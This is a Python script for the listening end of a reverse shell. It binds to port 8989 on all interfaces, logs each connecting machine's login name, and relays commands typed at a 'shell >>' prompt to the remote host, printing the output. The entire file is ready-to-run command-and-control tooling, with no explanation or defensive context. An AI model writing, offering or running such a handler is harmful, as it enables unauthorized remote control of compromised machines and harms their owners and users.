
import sys
import socket
#control c dosent close but ask if you want to
def reverse_shell(host='0.0.0.0', port=8989):
    server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    # Allow the address to be reused immediately after the server shuts down
    server_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    
    server_socket.bind((host, port))
    server_socket.listen(1)
    print(f'Listening on {host}:{port}')
    
    while True:
        try:
            client_socket, client_address = server_socket.accept()
            login_name = client_socket.recv(4096).decode()
            print(f'Connection from {client_address} login name:{login_name}')
            
            while True:
                try:
                    command = input("shell >> ").strip()  # Remove any extra whitespace
                    if not command:
                        print("No command entered. Please enter a command.")
                        continue
                    
                    if command.lower() == 'exit':
                        client_socket.send(command.encode())
                        break
                    
                    client_socket.send(command.encode())
                    response = client_socket.recv(4096).decode()
                    print(response)
                
                except (ConnectionResetError, BrokenPipeError) as e:
                    print(f"Connection error: {e}")
                    break
                except socket.timeout as e:
                    print(f"Socket timeout: {e}")
                    break
                except Exception as e:
                    print(f"Unexpected error: {e}")
                    break

        except (ConnectionResetError, BrokenPipeError) as e:
            print(f"Connection error: {e}")
        except socket.timeout as e:
            print(f"Socket timeout: {e}")
        except KeyboardInterrupt:
            break

        except Exception as e:
            print(f"Unexpected error: {e}")
        finally:
            if 'client_socket' in locals() and client_socket:
                client_socket.close()
                print("Client connection closed.")

    server_socket.close()
    print("Server socket closed.")

if __name__ == "__main__":
    reverse_shell()

